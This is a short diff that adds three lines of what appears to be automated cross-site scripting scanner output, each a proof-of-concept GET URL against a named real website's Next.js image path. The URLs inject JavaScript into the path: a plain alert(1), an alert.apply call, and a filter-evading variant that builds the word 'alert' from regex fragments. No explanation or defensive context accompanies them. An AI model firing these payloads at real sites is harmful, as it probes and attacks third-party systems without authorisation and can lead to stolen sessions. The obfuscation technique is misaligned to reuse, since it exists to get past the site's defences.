@@ -1,0 +1,3 @@
+[POC][R][GET][inJS-none(2)] http://lovable.dev/_next;alert.apply(null,[1]);/image?=&q=75&url=%2Fimg%2Fbackground%2Ffooter-background-card.jpg&w=1080
+[POC][R][GET][inJS-none(2)] http://lovable.dev/_next;frames[/al/.source+/ert/.source](/XSS/.source);/image?=&q=75&url=%2Fimg%2Fbackground%2Ffooter-background-card.jpg&w=1080
+[POC][R][GET][inJS-none(2)] http://lovable.dev/_nextalert(1)/image?=&q=75&url=%2Fimg%2Fbackground%2Ffooter-background-card.jpg&w=1080
